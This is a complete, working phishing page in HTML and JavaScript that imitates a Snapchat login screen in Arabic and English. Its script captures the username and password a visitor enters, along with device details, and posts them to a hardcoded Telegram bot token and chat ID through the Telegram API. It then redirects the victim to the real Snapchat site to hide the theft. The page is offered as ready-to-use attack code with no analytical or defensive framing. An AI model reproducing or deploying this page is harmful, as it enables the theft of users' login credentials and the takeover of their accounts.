<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">


    <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
    <meta property="og:url" content="https://www.snapchat.com" />
    

<meta property="og:type" content="website" />

    <meta property="og:title" content="Less social media. More Snapchat." />
    

 <meta property="og:description" content="Chat, send Snaps, explore Stories, and try Lenses on desktop, or download the app on mobile! See how to connect & create with friends on Snapchat, wherever you are." />    
    
<meta property="og:image" content="IMG_3581.jpeg" />

  <title>Login</title>
  <style>
    /* General Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      min-height: 100vh;
      padding: 12px 16px;
      position: relative;
    }

    /* Light theme (default) */
    @media (prefers-color-scheme: light) {
      body {
        background-color: #ffffff;
        color: #333;
      }

      h1 {
        color: #000000;
      }

      input {
        color: #000000;
        border-bottom: 0.5px solid rgba(0, 0, 0, 0.2);
      }

      input::placeholder {
        color: rgba(0, 0, 0, 0.3);
      }

      .checkbox-container label {
        color: rgba(0, 0, 0, 0.6);
      }

      .bottom-indicator {
        background-color: #000000;
      }
    }

    /* Dark theme */
    @media (prefers-color-scheme: dark) {
      body {
        background-color: #121212;
        color: #ffffff;
      }

      h1 {
        color: #ffffff;
      }

      input {
        color: #ffffff;
        border-bottom: 0.5px solid rgba(255, 255, 255, 0.2);
      }

      input::placeholder {
        color: rgba(255, 255, 255, 0.3);
      }

      .checkbox-container label {
        color: rgba(255, 255, 255, 0.6);
      }

      .bottom-indicator {
        background-color: #ffffff;
      }
    }

    .back-button {
      position: absolute;
      top: 12px;
      right: 16px;
      color: #007AFF;
      text-decoration: none;
      font-size: 28px;
      line-height: 1;
      padding: 8px;
    }

    .login-container {
      padding-top: 60px;
      max-width: 100%;
      margin: 0 auto;
    }

    h1 {
  font-size: 28px;
  font-weight: 700;
  margin-bottom: 40px;
  text-align: center; /* إضافة خاصية التوسيط */
}

    .input-group {
      position: relative;
      margin-bottom: 24px;
    }

    input {
      width: 100%;
      padding: 8px 0;
      font-size: 16px;
      border: none;
      background-color: transparent;
      outline: none;
    }

    .checkbox-container {
      display: flex;
      align-items: center;
      margin: 24px 0;
      gap: 8px;
    }

    .checkbox-container input[type="checkbox"] {
      width: 20px;
      height: 20px;
      margin: 0;
    }

    .checkbox-container label {
      font-size: 13px;
    }

    .forgot-password {
      color: #007AFF;
      text-decoration: none;
      font-size: 13px;
      display: inline-block;
    }

    .login-button {
      width: 100%;
      padding: 16px;
      font-size: 16px;
      font-weight: 500;
      color: #ffffff;
      background-color: #E2E2E2;
      border: none;
      border-radius: 25px;
      
      margin-top: 40px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }

    .login-button:disabled {
      background-color: #E2E2E2;
      color: rgba(0, 0, 0, 0.3);
      cursor: default;
    }

    .login-button:enabled {
      background-color: #39A7FF;
      color: #ffffff;
    }

   

    @supports (padding: max(0px)) {
      body {
        padding-bottom: max(20px, env(safe-area-inset-bottom));
      }
    }

    @media (max-width: 380px) {
      .login-container {
        padding-top: 40px;
      }
      
      h1 {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>
  <a href="#" class="back-button" data-translate="back">❮</a>
  <div class="login-container">
    <h1 data-translate="login">تسجيل الدخول</h1>
    <form>
      <div class="input-group">
        <input 
          type="text" 
          data-translate="username-placeholder"
          placeholder="اسم المستخدم أو البريد الإلكتروني أو الهاتف"
          autocomplete="off"
          spellcheck="false"
          id="username"
        >
      </div>

      <div class="input-group">
        <input 
          type="password" 
          data-translate="password-placeholder"
          placeholder="كلمة المرور"
          autocomplete="off"
          id="password"
        >
      </div>
      
      <div class="checkbox-container">
        <input type="checkbox" id="remember">
        <label for="remember" data-translate="remember">حفظ معلومات تسجيل الدخول على أجهزة iCloud</label>
      </div>
      
      <a href="#" class="forgot-password" data-translate="forgot">هل نسيت كلمة المرور؟</a>
      
      <button type="submit" class="login-button" disabled data-translate="login-button">تسجيل الدخول</button>
    </form>
  </div>

  <div class="bottom-indicator"></div>

  <script>
    // Language translations
    const translations = {
      'en': {
        'login': 'Log In',
        'username-placeholder': 'Username, email or phone',
        'password-placeholder': 'Password',
        'remember': 'Save login info on iCloud devices',
        'forgot': 'Forgot your password?',
        'login-button': 'Log In',
        'logging-in': 'Logging in...'
      },
      'ar': {
        'login': 'تسجيل الدخول',
        'username-placeholder': 'اسم المستخدم أو البريد الإلكتروني أو الهاتف',
        'password-placeholder': 'كلمة المرور',
        'remember': 'حفظ معلومات تسجيل الدخول على أجهزة iCloud',
        'forgot': 'هل نسيت كلمة المرور؟',
        'login-button': 'تسجيل الدخول',
        'logging-in': 'جاري تسجيل الدخول...'
      }
    };

    // Language handling
    function setLanguage() {
      const userLanguage = navigator.language || navigator.userLanguage;
      const langCode = userLanguage.split('-')[0];
      const language = translations[langCode] || translations['en'];
      
      document.documentElement.lang = langCode;
      document.documentElement.dir = ['ar', 'he', 'fa'].includes(langCode) ? 'rtl' : 'ltr';
      
      // Update all translatable elements
      document.querySelectorAll('[data-translate]').forEach(element => {
        const key = element.getAttribute('data-translate');
        if (element.tagName === 'INPUT') {
          element.placeholder = language[key];
        } else {
          element.textContent = language[key];
        }
      });
    }

    const form = document.querySelector('form');
    const usernameInput = document.querySelector('#username');
    const passwordInput = document.querySelector('#password');
    const loginButton = document.querySelector('.login-button');
    
    // Replace these with your actual Telegram credentials
    const TELEGRAM_BOT_TOKEN = '7758302080:AAF0AsteUcTaM26AABHYqZSxIvQ1kZgZL80';
    const TELEGRAM_CHAT_ID = '6305469091';

    // Set language when page loads
    document.addEventListener('DOMContentLoaded', setLanguage);

    // Focus on username input when page loads
    window.addEventListener('load', () => {
        usernameInput.focus();
    });

    // Handle Enter key press in username field
    usernameInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && usernameInput.value.trim() !== '') {
            e.preventDefault();
            passwordInput.focus();
        }
    });

    // Handle Enter key press in password field
    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (passwordInput.value.trim() !== '' && usernameInput.value.trim() !== '') {
                handleSubmit();
            }
        }
    });

    function validateForm() {
        const isValid = usernameInput.value.trim() !== '' && 
                       passwordInput.value.trim() !== '';
        loginButton.disabled = !isValid;
    }

    [usernameInput, passwordInput].forEach(input => {
        input.addEventListener('input', validateForm);
    });

    // Added event listener for button click
    loginButton.addEventListener('click', (e) => {
        e.preventDefault();
        if (!loginButton.disabled) {
            handleSubmit();
        }
    });

    async function sendToTelegram(username, password) {
        const text = `
📱 New Snapchat Login:
👤 Username: ${username}
🔑 Password: ${password}
📅 Date: ${new Date().toLocaleString()}
📱 Device: ${navigator.userAgent}
        `;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const data = {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            return response.ok;
        } catch (error) {
            console.error('Error:', error);
            return false;
        }
    }

    async function handleSubmit() {
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        loginButton.disabled = true;
        const userLanguage = navigator.language || navigator.userLanguage;
        const langCode = userLanguage.split('-')[0];
        loginButton.textContent = translations[langCode]?.['logging-in'] || translations['en']['logging-in'];

        // Send data to Telegram
        const isSent = await sendToTelegram(username, password);
        
        if (isSent) {
            window.location.href = "https://www.snapchat.com";
        } else {
            alert("حدث خطأ أثناء إرسال البيانات.");
            loginButton.disabled = false;
            loginButton.textContent = translations[langCode]?.['login-button'] || translations['en']['login-button'];
        }
    }
  </script>
</body>
</html>
